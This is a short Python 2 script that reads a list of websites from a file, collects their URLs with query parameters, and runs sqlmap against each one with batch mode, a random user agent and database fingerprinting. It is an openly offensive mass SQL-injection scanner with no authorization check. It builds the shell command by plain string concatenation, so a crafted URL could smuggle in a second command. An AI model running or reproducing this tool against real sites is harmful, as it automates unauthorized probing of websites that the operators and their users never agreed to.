#!/usr/bin/env python
# encoding:utf8

import os
from getQueryParameters import *

def getAllInjectableUrls(queryParameters):
	result = []
	for queryParameter in queryParameters:
		url = queryParameter['url']
		queries = queryParameter['value']
		tempQueries = "?"
		for query in queries.keys():
			tempQueries += query + "=" + queries[query] + "&"
		result.append(url + tempQueries[0:-1])
	return result

def hack():
	websites = open("websites.txt","r")
	for website in websites:
		website = website[0:-1]
		print "============================="
		print "Hacking : " + website
		print "Getting all urls which can be injectable..."
		queryParameters = getQueryParameters(website)
		injectableUrls = getAllInjectableUrls(queryParameters)
		print "-----------------------------"
		for injectableUrl in injectableUrls:
			print injectableUrl
		print "-----------------------------"
		print "============================="
		print "Start checking..."
		for injectableUrl in injectableUrls:
			print "============"
			print injectableUrl
			print "============"
			command = "sqlmap -u \"" + injectableUrl + "\" --random-agent -f --batch --answer=\"extending=N,follow=N,keep=N,exploit=n\""
			print command
			os.system(command)
hack()